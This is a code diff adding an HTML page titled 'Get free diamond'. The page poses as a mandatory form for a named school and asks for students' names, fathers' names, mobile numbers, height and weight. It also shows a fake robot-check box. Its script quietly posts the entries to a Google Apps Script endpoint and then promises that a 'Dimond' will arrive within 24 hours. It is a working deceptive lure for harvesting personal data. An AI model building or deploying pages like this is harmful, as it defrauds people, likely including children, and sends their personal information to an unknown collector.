@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Get free diamond</title>
+    <link rel="stylesheet" href="form.css">
+</head>
+
+<body>
+    
+  <center>  <div class="h1">
+        <h1 class="imgh1"> <img src="https://source.unsplash.com/900x900/? book,copy,pen" alt="" height="100px" width="100px" class="unimg"><br>  Aman Central English School<br>Chhatarpur Varanasi</h1>
+        
+    </div> </center>
+    
+    <div class="container">  
+        <div class="c1"></div>
+        <div class="c2"></div>
+        
+    </div>
+    <form class="form"  method="post" name="google-sheet">
+            <h3>Fill the given information<br> <span>This is necessary for all students ( Private also)</span> </h3>
+            <label for="uid" class="uid"><b>Your Name</b></label><br>
+           <input type="text" class="class" placeholder="Type your Name .." name="name" id="uid" ">
+           
+            <label for="uid" class="uid"><b>Father Name</b></label><br>
+           <input type="text" class="class" placeholder="Father name.." name="uid" id="uid">
+           
+           <label for="Mobile number" class="uid"><b>Mobile Number</b></label><br>
+           <input type="number" class="class" placeholder="Type Your Mobile Number" name="mobile">
+           
+           <label for="Password" class="uid"><b>Your Height</b></label><br>
+           <input type="text" class="class" placeholder="Your height.." name="hack">
+        
+           
+           <label for="uid" class="uid"><b>Your weight</b></label><br>
+           
+         <center>  
+           <input type="text" class="class" placeholder="Your weight.." name="select">
+           </center>
+           
+          <input type="checkbox" class="check" name="check"><label class="text-size">I am not a robot </lable>
+        
+           
+        <center>   <button type="submit" class="button" name="submit" onclick="window.location.reload();" >Send</button> </center>
+        <br><br><br><br><br><br><br>
+           
+            
+        </form>
+        
+       <br><br><br><br>
+       
+     <center>  <h6 class="h6img"> <br>RTM-RS CREATION<br><h6 class="hl">Copyright © 2024 RTM-RS CREATION ON YOUTUBE</h6></h6></center>
+     <br>
+       <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbynFTB8L29VQPBJMP0mxluqP5OLGc98VzJbrgTeJ_65VWKRARvkiJNwjZtLhxxDnMKW/exec' 
+       const form = document.forms['google-sheet']
+        form.addEventListener('submit', e => { 
+        e.preventDefault() 
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)}) 
+        .then(response => alert("Your Dimond will reach within 24 hours...")) 
+        .catch(error => console.error('Error!', error.message)) }) </script> 
+
+       
+</body>
+
+</html>
